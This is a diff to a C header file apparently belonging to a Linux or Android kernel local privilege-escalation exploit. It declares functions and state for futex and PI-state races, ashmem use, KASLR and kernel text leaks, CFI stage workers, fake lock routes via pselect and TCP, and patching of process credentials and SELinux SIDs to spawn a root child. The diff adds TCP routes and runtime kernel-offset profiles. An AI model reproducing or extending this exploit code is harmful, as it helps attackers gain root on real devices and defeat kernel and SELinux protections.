@@ -14,8 +14,11 @@
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <linux/falloc.h>
 #include <linux/futex.h>
 #include <linux/memfd.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
@@ -49,7 +52,7 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-#define MM_STRUCT_SZ 0x500
+#define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 #define CORE 0
@@ -137,9 +140,15 @@
 #define TMP_UNAME_DEFAULT_NAME "CatOS"
 #define TMP_UNAME_DEFAULT_HOLD_SEC 5
 
-#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
-#define P0_DATA_ALIAS_CONST(image_addr) \
-  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
+uintptr_t p0_phys_offset(void);
+uintptr_t p0_kernel_phys_load(void);
+uintptr_t p0_kernel_phys_delta(void);
+const char *p0_active_profile(void);
+uintptr_t p0_data_alias(uintptr_t image_addr);
+uintptr_t p0_alias_image_offset(uintptr_t data_alias);
+
+#define P0_KERNEL_PHYS_DELTA p0_kernel_phys_delta()
+#define P0_DATA_ALIAS_CONST(image_addr) p0_data_alias((uintptr_t)(image_addr))
 
 #define CONSUMER_CORE (CORE + 1)
 #define CONSUMER_MAX_CALLS 1
@@ -243,10 +252,16 @@ extern atomic_int route_done;
 extern atomic_int waiter_tid;
 extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
+extern atomic_int consumer_inflight;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
 extern atomic_int main_route_delay_usec;
 extern atomic_int cfi_stage_done;
+extern atomic_int cfi_worker_request;
+extern atomic_int cfi_worker_done;
+extern atomic_int cfi_worker_result;
+extern atomic_int cfi_worker_stop;
+extern atomic_int pi_cleanup_done;
 extern atomic_int pipe_prepare_request;
 extern atomic_int pipe_prepare_done;
 extern ssize_t cfi_write_ret;
@@ -375,8 +390,6 @@ int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
 int open_ashmem_device(void);
 int has_zero_byte(uintptr_t value);
-uintptr_t p0_data_alias(uintptr_t image_addr);
-uintptr_t p0_alias_image_offset(uintptr_t data_alias);
 uintptr_t data_addr(uintptr_t image_addr);
 uintptr_t kaslr_image_addr(uintptr_t image_addr);
 uintptr_t text_addr(uintptr_t image_addr);
@@ -420,6 +433,9 @@ void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
+void do_tcp_fake_lock_route(void);
+int run_cfi_stage_on_worker(void);
+void wait_for_consumer_idle(void);
 void reset_main_route_state(void);
 void run_main_route_threads(void);
 
@@ -438,6 +454,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void open_slide_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd);
 void slide_pselect_stack_copy(void);
+void slide_tcp_stack_copy(void);
 int hex_value(char c);
 uint64_t slide_read_stext(void);
 uint64_t slide_child_leak_stext(void);
@@ -498,6 +515,7 @@ int run_tmp_page_uname_stage(void);
 int spawn_root_child(void);
 int collect_root_child(void);
 uint64_t find_task_by_tgid(int fd, uint32_t want_tgid);
+int cleanup_main_waiter_pi_state(int fd);
 int patch_cred_identity(int fd, uintptr_t cred);
 int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
